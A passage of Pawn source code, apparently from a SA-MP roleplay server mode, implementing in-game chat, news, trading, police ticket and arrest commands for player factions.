                    else if(PlayerInfo[playerid][pRank] == 1) { format(string, sizeof(string), "** (( Piccioto %s: %s ))  **", sendername, result); }
                    else { format(string, sizeof(string), "** (( Piccioto %s: %s )) **", sendername, result); }
                    SendFamilyMessage(PlayerInfo[playerid][pMember], 0x01FCFFC8, string);
                }
                else if(member==16)
                {
                    if(PlayerInfo[playerid][pRank] == 7) { format(string, sizeof(string), "** (( Leader %s: %s )) **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 6) { format(string, sizeof(string), "** (( Co-Leader %s: %s )) **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 5) { format(string, sizeof(string), "** (( Manager %s: %s ))  **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 4) { format(string, sizeof(string), "** (( Senior Mechanic %s: %s ))  **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 3) { format(string, sizeof(string), "** (( Mechanic %s: %s ))  **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 2) { format(string, sizeof(string), "** (( Trainee %s: %s ))  **", sendername, result); }
                    else { format(string, sizeof(string), "** (( Trainee %s: %s )) **", sendername, result); }
                    SendFamilyMessage(PlayerInfo[playerid][pMember], 0x01FCFFC8, string);
                }
                    else if(member==17)
                {
                    if(PlayerInfo[playerid][pRank] == 7) { format(string, sizeof(string), "** (( Owner %s: %s )) **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 6) { format(string, sizeof(string), "** (( Co-Owner %s: %s )) **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 5) { format(string, sizeof(string), "** (( Sub Co-Owner %s: %s ))  **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 4) { format(string, sizeof(string), "** (( Level 4 %s: %s ))  **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 3) { format(string, sizeof(string), "** (( Level 3 %s: %s ))  **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 2) { format(string, sizeof(string), "** (( Level 2 %s: %s ))  **", sendername, result); }
                    else { format(string, sizeof(string), "** (( Level 1 %s: %s )) **", sendername, result); }
                    SendFamilyMessage(PlayerInfo[playerid][pMember], 0x01FCFFC8, string);
                }
                    else if(member==19)
                {
                    if(PlayerInfo[playerid][pRank] == 7) { format(string, sizeof(string), "** (( Don The Racers %s: %s )) **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 6) { format(string, sizeof(string), "** (( Consigliere %s: %s )) **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 5) { format(string, sizeof(string), "** (( Vicario %s: %s )) **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 4) { format(string, sizeof(string), "** (( Caporegime %s: %s ))  **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 3) { format(string, sizeof(string), "** (( Sgarrista %s: %s ))  **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 2) { format(string, sizeof(string), "** (( Soldato %s: %s ))  **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 1) { format(string, sizeof(string), "** (( Piccioto %s: %s ))  **", sendername, result); }
                    else { format(string, sizeof(string), "** (( Level 1 %s: %s )) **", sendername, result); }
                    SendFamilyMessage(PlayerInfo[playerid][pMember], 0x01FCFFC8, string);
                }
                else if(leader==1)
                {
                    return 1;
                }
                else if(leader==2)
                {
                    return 1;
                }
                else if(leader==3)
                {
                    return 1;
                }
                else if(leader==4)
                {
                    format(string, sizeof(string), "** (( Chief Fireman/Paramedic %s: %s )) **", sendername, result);
                    SendFamilyMessage(PlayerInfo[playerid][pLeader], 0x01FCFFC8, string);
                }
                else if(leader==5)
                {
                    format(string, sizeof(string), "** (( Don Silence Mafia %s: %s )) **", sendername, result);
                    SendFamilyMessage(PlayerInfo[playerid][pLeader], 0x01FCFFC8, string);
                }
                else if(leader==6)
                {
                    format(string, sizeof(string), "** (( Don The Killers %s: %s )) **", sendername, result);
                    SendFamilyMessage(PlayerInfo[playerid][pLeader], 0x01FCFFC8, string);
                }
                else if(leader==7)
                {
                    return 1;
                }
                else if(leader==8)
                {
                    format(string, sizeof(string), "** (( Director %s: %s )) **", sendername, result);
                    SendFamilyMessage(PlayerInfo[playerid][pLeader], 0x01FCFFC8, string);
                }
                else if(leader==9)
                {
                    format(string, sizeof(string), "** (( Network Producer %s: %s )) **", sendername, result);
                    SendFamilyMessage(PlayerInfo[playerid][pLeader], 0x01FCFFC8, string);
                }
                else if(leader==10)
                {
                    format(string, sizeof(string), "** (( Taxi Company Owner %s: %s )) **", sendername, result);
                    SendFamilyMessage(PlayerInfo[playerid][pLeader], 0x01FCFFC8, string);
                }
                else if(leader==11)
                {
                    format(string, sizeof(string), "** (( Boss %s: %s )) **", sendername, result);
                    SendFamilyMessage(PlayerInfo[playerid][pLeader], 0x01FCFFC8, string);
                }
                else if(leader==14)
                {
                    format(string, sizeof(string), "** (( FNF Leader %s: %s )) **", sendername, result);
                    SendFamilyMessage(PlayerInfo[playerid][pLeader], 0x01FCFFC8, string);
                }
                else if(leader==15)
                {
                    format(string, sizeof(string), "** (( Don Storm Men %s: %s )) **", sendername, result);
                    SendFamilyMessage(PlayerInfo[playerid][pLeader], 0x01FCFFC8, string);
                }
                else if(leader==12)
                {
                    format(string, sizeof(string), "** (( Don Dangerous Tigers %s: %s )) **", sendername, result);
                    SendFamilyMessage(PlayerInfo[playerid][pLeader], 0x01FCFFC8, string);
                }
                else if(leader==13)
                {
                    format(string, sizeof(string), "** (( Don Legendary Men %s: %s )) **", sendername, result);
                    SendFamilyMessage(PlayerInfo[playerid][pLeader], 0x01FCFFC8, string);
                }
                else if(leader==16)
                {
                    format(string, sizeof(string), "** (( Leader %s: %s )) **", sendername, result);
                    SendFamilyMessage(PlayerInfo[playerid][pLeader], 0x01FCFFC8, string);
                }
                else if(leader==17)
                {
                    format(string, sizeof(string), "** (( Owner %s: %s )) **", sendername, result);
                    SendFamilyMessage(PlayerInfo[playerid][pLeader], 0x01FCFFC8, string);
                }
                else if(leader==19)
                {
                    format(string, sizeof(string), "** (( Leader %s: %s )) **", sendername, result);
                    SendFamilyMessage(PlayerInfo[playerid][pLeader], 0x01FCFFC8, string);
                }
                //printf("%s", string);
                return 1;
            }
            else
            {
                SendClientMessage(playerid, COLOR_GRAD2, "   you are not part of a Family!");
                return 1;
            }
        }//not connected
        return 1;
    }


//--------------------------------------
        if(strcmp(cmd, "/news", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(PlayerInfo[playerid][pMember] == 9 || PlayerInfo[playerid][pLeader] == 9)
            {
                new newcar = GetPlayerVehicleID(playerid);
                if(PlayerInfo[playerid][pMuteTime] >= 1)
                {
                    SendClientMessage(playerid, TEAM_CYAN_COLOR, " You cannot speak, you have been silenced !");
                    return 1;
                }
				if(IsANrcar(newcar))
                {
                    GetPlayerName(playerid, sendername, sizeof(sendername));
                    new length = strlen(cmdtext);
                    while ((idx < length) && (cmdtext[idx] <= ' '))
                    {
                        idx++;
                    }
                    new offset = idx;
     new result[64];
                    while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
                    {
                        result[idx - offset] = cmdtext[idx];
                        idx++;
                    }
                    result[idx - offset] = EOS;
                    if(!strlen(result))
                    {
                        SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /news [newstext]");
                        return 1;
                    }
                    format(string, sizeof(string), "NR %s: %s", sendername, result);
                    OOCNews(COLOR_NewsNR,string);
                    if(PINFO[playerid][pNewsSkill])
                    {
                        PlayerInfo[playerid][pNewsSkill] ++;
                        SaveKonVal(playerid, "pNewsSkill", PINFO[playerid][pNewsSkill]);
                    }
                    if(PlayerInfo[playerid][pNewsSkill] == 50)
                    { SendClientMessage(playerid, COLOR_YELLOW, "* Your News Reporter Skill is now Level 2, soon you are able to Fly the News Chopper and talk Live."); }
                    else if(PlayerInfo[playerid][pNewsSkill] == 100)
                    { SendClientMessage(playerid, COLOR_YELLOW, "* Your News Reporter Skill is now Level 3, soon you are able to Fly the News Chopper and talk Live."); }
                    else if(PlayerInfo[playerid][pNewsSkill] == 200)
                    { SendClientMessage(playerid, COLOR_YELLOW, "* Your News Reporter Skill is now Level 4, you can fly the News Chopper now."); }
                    else if(PlayerInfo[playerid][pNewsSkill] == 400)
                    { SendClientMessage(playerid, COLOR_YELLOW, "* Your News Reporter Skill is now Level 5, you can now talk Live with any person you want."); }
                }
                else
                {
                    SendClientMessage(playerid, COLOR_GREY, " You are not in the News Van or Chopper !");
                    return 1;
                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREY, " You are not a News Reporter !");
            }
        }//not connected
        return 1;
    }
    if(strcmp(cmd, "/live", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(PlayerInfo[playerid][pMember] == 9 || PlayerInfo[playerid][pLeader] == 9)
            {
                if(TalkingLive[playerid] != 255)
                {
                    SendClientMessage(playerid, COLOR_WHITE, "* Live Conversation ended.");
                    SendClientMessage(TalkingLive[playerid], COLOR_WHITE, "* Live Conversation ended.");
                    TogglePlayerControllable(playerid, 1);
                    TogglePlayerControllable(TalkingLive[playerid], 1);
                    TalkingLive[TalkingLive[playerid]] = 255;
                    TalkingLive[playerid] = 255;
                    return 1;
                }
                if(PlayerInfo[playerid][pNewsSkill] < 50)
                {
                    SendClientMessage(playerid, COLOR_GREY, "   Your News Reporter Skill is to low to talk Live with people !");
                    return 1;
                }
                tmp = strtok(cmdtext, idx);
                if(!strlen(tmp))
                {
                    SendClientMessage(playerid, COLOR_GRAD1, "USAGE: /live [playerid/PartOfName]");
                    return 1;
                }
                //giveplayerid = strval(tmp);
                giveplayerid = ReturnUser(tmp);
                if (IsPlayerConnected(giveplayerid))
                {
                    if(giveplayerid != INVALID_PLAYER_ID)
                    {
                        if (ProxDetectorS(5.0, playerid, giveplayerid))
                        {
                            if(giveplayerid == playerid) { SendClientMessage(playerid, COLOR_GREY, "You cannot Talk Live with yourself!"); return 1; }
                            GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                            GetPlayerName(playerid, sendername, sizeof(sendername));
                            format(string, sizeof(string), "* You offered %s to have a Live Conversation.", giveplayer);
                            SendClientMessage(playerid, COLOR_WHITE, string);
                            format(string, sizeof(string), "* %s offered you to have a Live Conversation, type (/accept live) to accept.", sendername);
                            SendClientMessage(giveplayerid, COLOR_WHITE, string);
                            LiveOffer[giveplayerid] = playerid;
                        }
                        else
                        {
                            SendClientMessage(playerid, COLOR_GREY, "   You are to far away from that player !");
                            return 1;
                        }
                    }
                }
                else
                {
                    SendClientMessage(playerid, COLOR_GREY, "   Invalid ID/Name !");
                    return 1;
                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREY, "   You are not a News Reporter !");
            }
        }//not connected
        return 1;
    }
//=====================================[System SellMats]============================================================
   if(strcmp(cmd, "/sellmats", true) == 0)
   {
        if(IsPlayerConnected(playerid))
        {
            if(PlayerInfo[playerid][pJob] != 9)
            {
                SendClientMessage(playerid, COLOR_GREY, "   You are not a Arms Dealer!");
                return 1;
            }
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /sellmats [playerid/PartOfName] [ammount] [price]");
                return 1;
            }
            new playa;
			playa = ReturnUser(tmp);
			tmp = strtok(cmdtext, idx);
			if(!strlen(tmp)) { SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /sellmats [playerid/PartOfName] [ammount] [price]"); return 1; }
            Mhmats[playa] = strval(tmp);
            if(Mhmats[playa] < 1 || Mhmats[playa] > 100000) { SendClientMessage(playerid, COLOR_GREY, "Grams not lower then 1, or above 100,000!"); return 1; }
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp)) { SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /sellmats [playerid/PartOfName] [ammount] [price]"); return 1; }
            Mhmoney[playa] = strval(tmp);
            if(Mhmoney[playa] < 1 || Mhmoney[playa] > 1000) { SendClientMessage(playerid, COLOR_GREY, "Price not lower then $1, or above $1,000!"); return 1; }
            if(Mhmats[playa] > PlayerInfo[playerid][pMats]) { SendClientMessage(playerid, COLOR_GREY, "You dont have that much Materials with you !"); return 1; }
            if(IsPlayerConnected(playa))
            {
             if(playa != INVALID_PLAYER_ID)
                {
                    if (ProxDetectorS(8.0, playerid, playa))
                    {
                        if(playa == playerid)
                        {
                            SendClientMessage(playerid, COLOR_GREY, "Cant sell to yourself!");
                            return 1;
                        }
                        if(pwantmat[playa] == 1) { SCM(playerid,COLOR_BLUE, " You already offerd to this player!!"); return 1; }
                        GetPlayerName(playa, giveplayer, sizeof(giveplayer));
                        GetPlayerName(playerid, pseller, sizeof(pseller));
                        pwantmat[playa] = 1;
                        format(string, sizeof(string), "You offerd %s to buy %d Amount of Materials for $%d.", giveplayer, Mhmats[playa], Mhmoney[playa]);
                        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                        format(string, sizeof(string), "Arms Dealer %s wants to sell you %d Materials for $%d, (type /accept Mats %i) to buy.", psellername, Mhmats[playa], Mhmoney[playa], playerid);
                        SendClientMessage(playa, COLOR_LIGHTBLUE, string);
						pseller[playa] = playerid;
                    }
                    else
                    {
                        SendClientMessage(playerid, COLOR_GREY, "That player is not near you !");
                    }
                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREY, "That player is offline.");
            }
        }
        		return 1;
	}

//===========================================================================================================================

    if(strcmp(cmd, "/selldrugs", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(PlayerInfo[playerid][pJob] != 4)
            {
                SendClientMessage(playerid, COLOR_GREY, "   You are not a Drugs Dealer!");
                return 1;
            }
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /selldrugs [playerid/PartOfName] [ammount] [price]");
                return 1;
            }
            new playa;
            new money;
            new needed;
            playa = ReturnUser(tmp);
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp)) { SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /selldrugs [playerid/PartOfName] [ammount] [price]"); return 1; }
            needed = strval(tmp);
            if(needed < 1 || needed > 99) { SendClientMessage(playerid, COLOR_GREY, "Grams not lower then 1, or above 99!"); return 1; }
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp)) { SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /selldrugs [playerid/PartOfName] [ammount] [price]"); return 1; }
            money = strval(tmp);
            if(money < 1 || money > 1000) { SendClientMessage(playerid, COLOR_GREY, "Price not lower then $1, or above $1,000!"); return 1; }
            if(needed > PlayerInfo[playerid][pDrugs]) { SendClientMessage(playerid, COLOR_GREY, "You dont have that much Drugs with you !"); return 1; }
            if(IsPlayerConnected(playa))
            {
                if(playa != INVALID_PLAYER_ID)
                {
                    if (ProxDetectorS(8.0, playerid, playa))
                    {
                        if(playa == playerid)
                        {
                            SendClientMessage(playerid, COLOR_GREY, "Cant sell to yourself!");
                            return 1;
                        }
                        if(DrugOffer[playa] == playerid) { SCM(playerid,COLOR_BLUE, " You already offerd to this player!!"); return 1; }
                        GetPlayerName(playa, giveplayer, sizeof(giveplayer));
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                        format(string, sizeof(string), "You offerd %s to buy %d gram of drugs for $%d.", giveplayer, needed, money);
                        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                        format(string, sizeof(string), "Drug Dealer %s wants to sell you %d gram for $%d, (type /accept drugs %i) to buy.", sendername, needed, money, playerid);
                        SendClientMessage(playa, COLOR_LIGHTBLUE, string);
                        DrugOffer[playa] = playerid;
                        DrugPrice[playa] = money;
                        DrugGram[playa] = needed;
                        DrugSell[playerid] = playa;
                    }
                    else
                    {
                        SendClientMessage(playerid, COLOR_GREY, "That player is not near you !");
                    }
                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREY, "That player is offline.");
            }
        }
        		return 1;
	}
	if(strcmp(cmd, "/gotogs", true) == 0)
	{
		if(IsPlayerConnected(playerid))
		{
		if (PlayerInfo[playerid][pAdmin] >= 5)
			{
	if (GetPlayerState(playerid) == 2)
	{
		new tmpcar = GetPlayerVehicleID(playerid);
		SetVehiclePos(tmpcar,1790.8438,-1166.4854,23.8281);
		TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
		}
	else
	{
	SetPlayerPosEx(playerid, 1790.8438,-1166.4854,23.8281);
	}
	Mahal[playerid] = 9999;
	TooHouse[playerid] = 9999;
	TooBiz[playerid] = 9999;
	SCM(playerid, COLOR_GREEN, "You have been teleported to LS Gun Shop");
	SetPlayerInterior(playerid,0);
	}
			else
			{
				SendClientMessage(playerid, COLOR_GREEN, "Error: Your Admin level isn't high enough to use this command.");
			}
		}
		 	return 1;
	}
		if(strcmp(cmd, "/servernews", true) == 0 || strcmp(cmd, "/sn", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	        if(gPlayerLogged[playerid] == 0)
	        {
	            SendClientMessage(playerid, COLOR_RED, "Not loggened in!");
	            return 1;
	        }
			if (PlayerInfo[playerid][pAdmin] <= 7)
			{
				SendClientMessage(playerid, COLOR_YELLOW2, "Error: You are not admin.");
				return 1;
			}
			GetPlayerName(playerid, sendername, sizeof(sendername));
			new result[145];
			result = strtokEx(cmdtext, idx);
			if(!strlen(result))
			{
				SendClientMessage(playerid, COL_SYN, "Syntax: (/sn) <Text>");
				return 1;
			}
			if(PlayerInfo[playerid][pAdmin]== 5){format(string, sizeof(string), "(( %s: %s ))" , sendername, result);}
			else {format(string, sizeof(string), "{466FC0}(( ServerNews: %s ))" , result);}
			OOCOff(COLOR_RED,string);
			printf("%s", string);
		}
        return 1;
    }

	if(strcmp(cmd, "/usedrugs", true) == 0)
	{
	    if(CanUseDrug[playerid] == 1) return SendClientMessage(playerid, COLOR_GREY, "You must 3 second wait to use drugs.");
		if(PlayerInfo[playerid][pDrugs] >= 2)
		{
			FixKhoon(playerid);
			FixKhoon(playerid);
			SetTimerEx("UseDrugTimer", 3000, false, "i", playerid);
			SendClientMessage(playerid, COLOR_GREY, "2 Grams of Drugs used.");
			PlayerInfo[playerid][pDrugs] -= 2;
			CanUseDrug[playerid] =1;
			SaveKonVal(playerid, "pDrugs", PINFO[playerid][pDrugs]);
			SetPlayerDrunkLevel(playerid, 2100);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You dont have any Drug Grams left !");
		}
		return 1;
	}

    if(strcmp(cmd, "/eject", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            new State;
            if(IsPlayerInAnyVehicle(playerid))
            {
                State=GetPlayerState(playerid);
                if(State!=PLAYER_STATE_DRIVER)
                {
                    SendClientMessage(playerid,COLOR_GREY,"   You can only eject people as the driver !");
                    return 1;
                }
                tmp = strtok(cmdtext, idx);
                if(!strlen(tmp))
                {
                    SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /eject [playerid/PartOfName]");
                    return 1;
                }
                new playa;
                playa = ReturnUser(tmp);
                new test;
                test = GetPlayerVehicleID(playerid);
                if(IsPlayerConnected(playa))
                {
                    if(playa != INVALID_PLAYER_ID)
                    {
                        if(playa == playerid) { SendClientMessage(playerid, COLOR_GREY, "You cannot Eject yourself!"); return 1; }
                        if(IsPlayerInVehicle(playa,test))
                        {
                            new PName[MAX_PLAYER_NAME];
                            GetPlayerName(playerid,PName,sizeof(PName));
                            GetPlayerName(playa, giveplayer, sizeof(giveplayer));
                            format(string, sizeof(string), "* You have thrown %s out of the car!", giveplayer);
                            SendClientMessage(playerid, COLOR_WHITE, string);
                            format(string, sizeof(string), "* You have been thrown out the car by %s !", PName);
                            SendClientMessage(playa, COLOR_WHITE, string);
                            RemovePlayerFromVehicle(playa);
                        }
                        else
                        {
                            SendClientMessage(playerid, COLOR_GREY, "   That player is not in your Car !");
                            return 1;
                        }
                    }
                }
                else
                {
                    SendClientMessage(playerid, COLOR_GREY, " Invalid ID/Name!");
                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREY, "   You need to be in a Vehicle to use this !");
            }
        }
        return 1;
    }

    if(strcmp(cmd, "/wanteds", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(gTeam[playerid] == TEAM_COP || IsACop(playerid))
            {
            if(OnDuty[playerid] != 1)
            {
                SendClientMessage(playerid, COLOR_BLUE, "You are not on-duty.");
                return 1;
            }
                new x;
                SendClientMessage(playerid, COLOR_GREEN, "|_________[Wanted List]_______|");
                for(new i=0; i < LastPID; i++) {
                    if(IsPlayerConnected(i))
                    {
                        if(GetPlayerWantedLevel(i) >= 1)
                        {
                            GetPlayerName(i, giveplayer, sizeof(giveplayer));
                            format(string, sizeof(string), "%s%s: %d", string,giveplayer,GetPlayerWantedLevel(i));
                            x++;
                            if(x > 3) {
                                SendClientMessage(playerid, COLOR_YELLOW, string);
                                x = 0;
                                format(string, sizeof(string), "");
                            } else {
                                format(string, sizeof(string), "%s, ", string);
                            }
                        }
                    }
                }
                if(x <= 3 && x > 0) {
                    string[strlen(string)-2] = '.';
                    SendClientMessage(playerid, COLOR_YELLOW, string);
                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_BLUE, "You're not a Cop.");
            }
        }//not connected
        return 1;
    }
    if(strcmp(cmd, "/dropcar", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(PlayerInfo[playerid][pJob] == 5)
            {
                if(PlayerInfo[playerid][pCarTime] == 0)
                {
                if(OnCheckpoint[playerid] == 1) return SCM(playerid,COLOR_Good,"You already have an enable checkpoint.");
                if(!IsPlayerInAnyVehicle(playerid)) return SCM(playerid,COLOR_LIGHTBLUE,"You are not in any vehicle.");
                if(CP[playerid] >= 1 || RCP[playerid] >= 1) return SCM(playerid,COLOR_LIGHTBLUE,"You already have a checkpoint.");
                    SCM(playerid,COLOR_LIGHTBLUE,"Drive this Vehicle to the checkpoint");
                    OnCheckpoint[playerid] = 1;
                    CP[playerid] = 1;
                    SetPlayerCheckpoint(playerid, 2855.1455,896.1536,10.1521,8.0);
                }
                else
                {
                    SendClientMessage(playerid, COLOR_GREY, "You already Dropped a car, wait till your reload time is over.");
                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_BLUE, "You are not a Car Jacker.");
            }
        }
        return 1;
    }
    //---------------------------------------------
    if(strcmp(cmd, "/quitjob", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(PINFO[playerid][pJob] == 1)
            {
                if(FindTime[playerid] > 0)
                {
                    OnPlayerCommandText(playerid, "/cancel find");
                }
            }
            if(PlayerInfo[playerid][pJob] >= 1)
            {
                SendClientMessage(playerid, COLOR_LIGHTBLUE, "You quited from your job.");
                PlayerInfo[playerid][pJob] = 0;
                SaveKonVal(playerid, "pJob", 0);
            }
            else
            {
                SendClientMessage(playerid, COLOR_LIGHTBLUE, "You are unemployed!");
            }
        }
        return 1;
    }


    if(strcmp(cmd, "/q", true) == 0)
    {
    	PlayerInfo[playerid][pOnline] = 0;
        SaveKonVal(playerid, "pOnline", 0);
        return 1;
    }


    if(strcmp(cmd, "/quit", true) == 0)
    {
    	PlayerInfo[playerid][pOnline] = 0;
        SaveKonVal(playerid, "pOnline", 0);
        return 1;
    }


    //----------------------------------------------------------------------------------
    if(strcmp(cmd, "/ticket", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(!IsAPDMember(playerid))
            {
                SendClientMessage(playerid, COLOR_BLUE, "You are not a Police Department.");
                return 1;
            }
            if(OnDuty[playerid] != 1)
            {
                SendClientMessage(playerid, COLOR_BLUE, "You are not On-Duty.");
                return 1;
            }
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /ticket [playerid/PartOfName] [price] [reason]");
                return 1;
            }
            giveplayerid = ReturnUser(tmp);
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /ticket [playerid/PartOfName] [price] [reason]");
                return 1;
            }
            moneys = strval(tmp);
            if(moneys < 1 || moneys > 2000) { SendClientMessage(playerid, COL_SYN, "Ticket Money can't be below $1 or higher then $2,000"); return 1; }
            if(IsPlayerConnected(giveplayerid))
            {
                if(giveplayerid != INVALID_PLAYER_ID)
                {
                    if (ProxDetectorS(8.0, playerid, giveplayerid))
                    {
                        GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                        new length = strlen(cmdtext);
                        while ((idx < length) && (cmdtext[idx] <= ' '))
                        {
                            idx++;
                        }
                        new offset = idx;
      new result[64];
                        while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
                        {
                            result[idx - offset] = cmdtext[idx];
                            idx++;
                        }
                        result[idx - offset] = EOS;
                        if(!strlen(result))
                        {
                            SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /ticket [playerid/PartOfName] [price] [reason]");
                            return 1;
                        }
                        format(string, sizeof(string), "You gave %s a Ticket costing $%d, reason: %s", giveplayer, moneys, (result));
                        SendClientMessage(playerid, COL_SYN, string);
                        format(string, sizeof(string), "Officer %s has given you a Ticket costing $%d, reason: %s", sendername, moneys, (result));
                        SendClientMessage(giveplayerid, COL_SYN, string);
                        format(string, sizeof(string), "Use /accept ticket %d, to accept ticket or cancel.",playerid);
                        SCM(giveplayerid,COL_SYN,string);
                        TicketOffer[giveplayerid] = playerid;
                        TicketMoney[giveplayerid] = moneys;
                        return 1;
                    }
                    else
                    {
                        SendClientMessage(playerid, COLOR_GREY, "That player is not near you.");
                        return 1;
                    }
                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREY, "That player is Offline");
                return 1;
            }
        }
        return 1;
    }
    if(strcmp(cmd, "/arrest", true) == 0)
    {
        if(gTeam[playerid] == TEAM_COP  || IsACop(playerid))
        {
            if(OnDuty[playerid] != 1)
            {
                SendClientMessage(playerid, COLOR_BLUE, "You are not on-duty.");
                return 1;
            }
            if(Mahal[playerid] == 2 || PTP(30.0, playerid, 1799.992309,-1578.568725,14.076499) || PTP(3.0, playerid,2296.650146,2468.680419,10.820312) || PTP(3.0,playerid,1568.530761,-1692.570068,5.890625) || PTP(4.0,playerid,2296.014648,2450.677490,10.820312) || PTP(4.0,playerid,-1592.815551,716.191406,-5.242187))
            {
                new suspect;
                tmp = strtok(cmdtext, idx);
                if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /arrest <PlayerID/PartOfName>");
                suspect = ReturnUser(tmp);
                if(!IsPlayerConnected(suspect)) return SCM(playerid,COLOR_ALI,"Player is not connected.");
                if(GetPlayerWantedLevel(suspect) <= 0) return SCM(playerid,COLOR_ALI,"That player must be least wanted level 1.");
                new Float:x,Float:y,Float:z;
                GetPlayerPos(suspect,x,y,z);
                if(!PTP(4.0,playerid,x,y,z)) return SCM(playerid,COLOR_ALI,"That player is not near you!");
                new time;
                if(GetPlayerWantedLevel(suspect) == 1)
                {
                    moneys = 1000;
                }
                else if(GetPlayerWantedLevel(suspect) == 2)
                {
                    moneys = 1500;
                }
                else if(GetPlayerWantedLevel(suspect) == 3)
                {
                    moneys = 2000;
                }
                else if(GetPlayerWantedLevel(suspect) == 4)
                {
                    moneys = 2500;
                }
                else if(GetPlayerWantedLevel(suspect) == 5)
                {
                    moneys = 3000;
                }
                else if(GetPlayerWantedLevel(suspect) >= 6)
                {
                    moneys = 5000;
                }
                if(GetPlayerWantedLevel(suspect) <= 6) time = (GetPlayerWantedLevel(suspect))*(120);
                else time = 6000;
                GetPlayerName(suspect, giveplayer, sizeof(giveplayer));
                GetPlayerName(playerid, sendername, sizeof(sendername));
                format(string, sizeof(string), "You arrested %s", giveplayer);
                SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                GivePlayerPool(suspect, -moneys);
                GivePlayerPool(playerid,moneys);
                format(string, sizeof(string), "arrested by %s ~n~    for $%s", sendername, FormatNumber(moneys));
                GameTextForPlayer(suspect, string, 5000, 5);
                ResetPlayerTofang(suspect);
                PlayerInfo[suspect][pJailTime] = time;
                SaveKonVal(suspect, "pJailTime", time);
                TogglePlayerControllable(suspect, 1);
                PlayerCuffed[suspect] = 0;
                RemovePlayerAttachedObject(suspect, 1);
                PlayerHandsCuffed[suspect] = 0;
                SetPlayerSpecialAction(suspect,SPECIAL_ACTION_NONE);
                if(PlayerInfo[playerid][pMember]==1||PlayerInfo[playerid][pLeader]==1)
                {
                    format(string, sizeof(string), "<< Officer %s arrested suspect %s for %d seconds ($%s) >>", sendername, giveplayer, PlayerInfo[suspect][pJailTime], FormatNumber(moneys));
                    SendFamilyMessage(1, COLOR_LIGHTRED, string);
                    SendFamilyMessage(2, COLOR_LIGHTRED, string);
                    SendFamilyMessage(3, COLOR_LIGHTRED, string);
                }
                else if(PlayerInfo[playerid][pMember]==2||PlayerInfo[playerid][pLeader]==2)
                {
                    format(string, sizeof(string), "<< FBI Agent %s arrested suspect %s for %d seconds ($%s) >>", sendername, giveplayer, PlayerInfo[suspect][pJailTime], FormatNumber(moneys));
                    SendFamilyMessage(1, COLOR_LIGHTRED, string);
                    SendFamilyMessage(2, COLOR_LIGHTRED, string);
                    SendFamilyMessage(3, COLOR_LIGHTRED, string);
                }
                else if(PlayerInfo[playerid][pMember]==3||PlayerInfo[playerid][pLeader]==3)
                {
                    format(string, sizeof(string), "<< Soldier %s arrested suspect %s for %d seconds ($%s) >>", sendername, giveplayer, PlayerInfo[suspect][pJailTime], FormatNumber(moneys));
                    SendFamilyMessage(1, COLOR_LIGHTRED, string);
                    SendFamilyMessage(2, COLOR_LIGHTRED, string);
                    SendFamilyMessage(3, COLOR_LIGHTRED, string);
                }
